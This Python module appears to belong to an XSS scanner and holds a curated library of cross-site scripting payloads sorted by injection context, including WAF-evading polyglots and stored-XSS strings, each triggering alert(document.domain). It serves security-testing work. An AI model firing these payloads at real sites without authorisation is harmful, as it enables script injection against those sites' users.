"""Hand-curated XSS seed payload library.

Organized by context_type matching probe.py ReflectionContext.context_type values.
Each payload calls alert(document.domain) or confirm(document.domain).
No two payloads share the same element+event_handler combination.
Sources: PortSwigger XSS cheat sheet, dalfox payload library, public WAF bypass
research, bug bounty writeups.
"""
from __future__ import annotations

GOLDEN_SEEDS: dict[str, list[str]] = {
    "html_body": [
        "<details open ontoggle=alert(document.domain)>",
        "<svg/onload=alert(document.domain)>",
        "<img src=x onerror=alert(document.domain)>",
        "<video><source onerror=alert(document.domain)></video>",
        "<body onload=alert(document.domain)>",
        "<input autofocus onfocus=alert(document.domain)>",
        "<marquee onstart=alert(document.domain)>",
        "<object data=javascript:alert(document.domain)>",
        "<embed src=javascript:alert(document.domain)>",
        "<audio src=x onerror=alert(document.domain)>",
        "<math><mtext></table></math><img src=x onerror=alert(document.domain)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
    ],
    "html_attr_event": [
        "\" autofocus onfocus=alert(document.domain) x=\"",
        "\" onmouseover=alert(document.domain) x=\"",
        "' onerror=alert(document.domain) x='",
        "\" onpointerenter=alert(document.domain) x=\"",
        "\" onanimationstart=alert(document.domain) style=\"animation-name:x\" x=\"",
        "\" onblur=alert(document.domain) tabindex=1 id=x x=\"",
        "\" onclick=alert(document.domain) x=\"",
        "' onload=alert(document.domain) x='",
    ],
    "html_attr_url": [
        "javascript:alert(document.domain)",
        "javascript://%0aalert(document.domain)",
        "data:text/html,<script>alert(document.domain)</script>",
        "javascript:void(0);alert(document.domain)",
        "javascript:/*--></title></style></textarea></script><xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'",
        "j&#97;vascript:alert(document.domain)",
    ],
    "js_string_dq": [
        "\"-alert(document.domain)-\"",
        "\";alert(document.domain)//",
        "\\u0022;alert(document.domain)//",
        "\"+alert(document.domain)+\"",
        "\";/**/alert(document.domain)//",
    ],
    "js_string_sq": [
        "'-alert(document.domain)-'",
        "';alert(document.domain)//",
        "\\u0027;alert(document.domain)//",
        "'+alert(document.domain)+'",
        "';/**/alert(document.domain)//",
    ],
    "js_template": [
        "${alert(document.domain)}",
        "`;alert(document.domain)//`",
        "${alert`document.domain`}",
    ],
    "url_fragment": [
        "#\"><img src=x onerror=alert(document.domain)>",
        "#javascript:alert(document.domain)",
        "#<svg/onload=alert(document.domain)>",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert(document.domain))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e",
        "\"><svg/onload=alert(document.domain)>'\"><img src=x onerror=alert(document.domain)>",
        "';alert(document.domain)//\"><img src=x onerror=alert(document.domain)><!--",
    ],
}

STORED_UNIVERSAL: list[str] = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(document.domain)>",
    "<details open ontoggle=alert(document.domain)>",
    "<body onload=alert(document.domain)>",
    "<video><source onerror=alert(document.domain)></video>",
    "'><script>alert(document.domain)</script>",
    "'\"><img src=x onerror=alert(document.domain)>",
    "<input autofocus onfocus=alert(document.domain)>",
    "<audio src=x onerror=alert(document.domain)>",
    "<embed src=javascript:alert(document.domain)>",
    "javascript:alert(document.domain)",
]


def seeds_for_context(context_type: str, n: int = 3) -> list[str]:
    """Return up to n golden seeds for context_type. Falls back to polyglots."""
    if n <= 0:
        return []
    candidates = GOLDEN_SEEDS.get(context_type) or GOLDEN_SEEDS.get("polyglot", [])
    return list(candidates[:n])


def all_seeds_flat() -> list[str]:
    """Return all seeds from GOLDEN_SEEDS deduplicated, preserving first-seen order."""
    seen: set[str] = set()
    result: list[str] = []
    for payloads in GOLDEN_SEEDS.values():
        for p in payloads:
            if p not in seen:
                seen.add(p)
                result.append(p)
    return result


def stored_universal_payloads() -> list[str]:
    """Return the universal stored XSS payload list."""
    return list(STORED_UNIVERSAL)
